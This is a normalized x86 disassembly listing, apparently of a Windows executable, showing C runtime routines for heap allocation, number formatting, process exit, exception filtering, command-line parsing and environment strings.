jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_40f45b
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40f3aa
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_40f3aa
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_40f45b
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_40f556
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_40f583
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x8 ]
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
fsubr [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fcomp [ r--data ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
leave
retn
push 0x1
pop eax
leave
retn
sub_40f5c1
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_40f583
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_40f5ea
push esi
mov esi [ esp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_40fa25
cmp eax 0x65
pop ecx
je r-xdata
mov cl [ rw-data ]
mov al [ esi ]
mov [ esi ] cl
inc esi
inc esi
cmp [ rw-data ] 0x1
jle r-xdata
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
retn
movsx eax [ esi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x4
movsx eax [ esi ]
push 0x4
push eax
call sub_40e3a6
pop ecx
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
sub_40f644
mov eax [ esp + 0x4 ]
mov dl [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
cmp cl dl
je r-xdata
retn
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx eax
cmp cl 0x65
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
cmp [ eax ] dl
jne r-xdata
cmp cl 0x45
je r-xdata
mov dl [ ecx ]
inc eax
inc ecx
test dl dl
mov [ eax ] dl
jne r-xdata
dec eax
inc eax
jmp r-xdata
sub_40f6aa
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_411996
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
call sub_411969
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_40f6e8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
je r-xdata
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_411b37
mov ebx [ ebp + 0x10 ]
mov esi eax
push esi
mov edx [ ebp + 0xc ]
lea eax [ ebx + 0x1 ]
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
xor ecx ecx
test ebx ebx
setg cl
add edx eax
add ecx edx
push ecx
call sub_411ac0
add esp 0x14
mov ebx [ ebp + 0x10 ]
mov eax [ rw-data ]
xor ecx ecx
mov esi eax
test ebx ebx
setg cl
push ecx
xor ecx ecx
cmp [ eax ] 0x2d
sete cl
add ecx [ ebp + 0xc ]
push ecx
call sub_40fa00
pop ecx
pop ecx
jmp r-xdata
test ebx ebx
jle r-xdata
mov [ eax ] 0x2d
inc eax
cmp [ esi ] 0x2d
mov eax [ ebp + 0xc ]
jne r-xdata
xor ecx ecx
push r--data
cmp [ rw-data ] cl
sete cl
add ecx eax
add ecx ebx
push ecx
call sub_4119d0
cmp [ ebp + 0x14 ] 0x0
pop ecx
pop ecx
mov ecx eax
je r-xdata
mov cl [ eax + 0x1 ]
push edi
lea edi [ eax + 0x1 ]
mov [ eax ] cl
mov cl [ rw-data ]
mov eax edi
pop edi
mov [ eax ] cl
mov eax [ esi + 0xc ]
inc ecx
cmp [ eax ] 0x30
je r-xdata
mov [ ecx ] 0x45
mov eax [ ebp + 0xc ]
pop esi
pop ebx
pop ebp
retn
mov ebx [ esi + 0x4 ]
dec ebx
jns r-xdata
inc ecx
cmp ebx 0x64
jl r-xdata
neg ebx
mov [ ecx ] 0x2d
inc ecx
cmp ebx 0xa
jl r-xdata
mov eax ebx
push 0x64
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
add [ ecx + 0x1 ] bl
mov eax ebx
push 0xa
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
sub_40f7ec
cmp [ rw-data ] 0x0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
je r-xdata
mov eax [ esp + 0x14 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_411b37
mov ebx [ esp + 0x24 ]
mov esi eax
push esi
mov eax [ esi + 0x4 ]
add eax ebx
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
add eax ebp
push eax
call sub_411ac0
add esp 0x14
mov eax [ rw-data ]
mov ebx [ esp + 0x1c ]
mov esi [ rw-data ]
cmp eax ebx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebp ] 0x2d
lea edi [ ebp + 0x1 ]
cmp [ esi ] 0x2d
mov edi ebp
jne r-xdata
xor ecx ecx
cmp [ esi ] 0x2d
sete cl
add ecx eax
add ecx ebp
mov eax ecx
mov [ eax ] 0x30
and [ eax + 0x1 ] 0x0
jmp r-xdata
add edi eax
push 0x1
push edi
call sub_40fa00
pop ecx
mov [ edi ] 0x30
pop ecx
inc edi
jmp r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push 0x1
push edi
call sub_40fa00
mov al [ rw-data ]
pop ecx
mov [ edi ] al
mov esi [ esi + 0x4 ]
inc edi
pop ecx
test esi esi
jge r-xdata
test ebx ebx
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
neg esi
cmp ebx esi
jl r-xdata
neg esi
jmp r-xdata
push ebx
push edi
call sub_40fa00
push ebx
push 0x30
push edi
call sub_40ce70
add esp 0x14
mov ebx esi
sub_40f8ca
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push ecx
push ecx
fld [ edi ]
fstp [ esp ]
call sub_411b37
mov [ rw-data ] eax
mov ecx [ eax + 0x4 ]
dec ecx
mov ebx [ ebp + 0x10 ]
mov [ rw-data ] ecx
xor ecx ecx
cmp [ eax ] 0x2d
push eax
push ebx
sete cl
add ecx [ ebp + 0xc ]
mov esi ecx
push esi
call sub_411ac0
mov eax [ rw-data ]
add esp 0x14
mov ecx [ eax + 0x4 ]
dec ecx
cmp [ rw-data ] ecx
setl cl
mov [ rw-data ] cl
mov eax [ eax + 0x4 ]
dec eax
cmp eax 0xfffffffc
mov [ rw-data ] eax
jl r-xdata
push [ ebp + 0x14 ]
push ebx
push [ ebp + 0xc ]
push edi
call sub_40f965
add esp 0x10
cmp eax ebx
jge r-xdata
test cl cl
je r-xdata
push ebx
push [ ebp + 0xc ]
push edi
call sub_40f98c
add esp 0xc
jmp r-xdata
mov al [ esi ]
inc esi
test al al
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
and [ esi - 0x2 ] al
sub_40f9af
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x65
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f6e8
cmp [ ebp + 0x10 ] 0x45
je r-xdata
cmp [ ebp + 0x10 ] 0x66
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f8ca
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f7ec
add esp 0xc
pop ebp
retn
add esp 0x10
pop ebp
retn
sub_40fa00
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
push esi
call sub_410c80
inc eax
push eax
push esi
add esi edi
push esi
call sub_410770
add esp 0x10
pop esi
sub_40fa25
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_40e3a6
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_40e157
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_40fb3f
push edi
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_40fbd8
pop ecx
pop ecx
test ebx ebx
pop ebx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
retn
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
push rw-data
push rw-data
call sub_40fbd8
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_40fbf2
push ebp
mov ebp esp
push ebx
push [ ebp + 0x8 ]
call sub_40fd33
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop ebx
pop ebp
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov ecx [ rw-data ]
mov edx [ rw-data ]
add edx ecx
push esi
cmp ecx edx
jge r-xdata
mov eax [ eax ]
mov esi [ rw-data ]
cmp eax 0xc000008e
jne r-xdata
lea esi [ ecx + ecx * 2 ]
sub edx ecx
lea esi [ esi * 4 + rw-data ]
cmp eax 0xc0000090
jne r-xdata
mov [ rw-data ] 0x83
jmp r-xdata
and [ esi ] 0x0
add esi 0xc
dec edx
jne r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ rw-data ] 0x81
jmp r-xdata
push [ rw-data ]
push 0x8
call ebx
pop ecx
mov [ rw-data ] esi
pop ecx
pop esi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ rw-data ] 0x84
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ rw-data ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ rw-data ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ rw-data ] 0x86
jmp r-xdata
mov [ rw-data ] 0x8a
sub_40fd33
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_40fd76
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_412060
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_411c5a
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_40fdce
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_412060
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_40c823
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_40cae3
pop ecx
push esi
call sub_410c80
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_40c7f4
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_40c823
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_410c80
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_4119d0
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_40cae3
pop ecx
sub_40fe87
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_412060
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_40ff20
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_40c823
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_40ff20
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_40cae3
pop ecx
sub_40ff20
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_4100d4
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_40c823
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_40c823
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
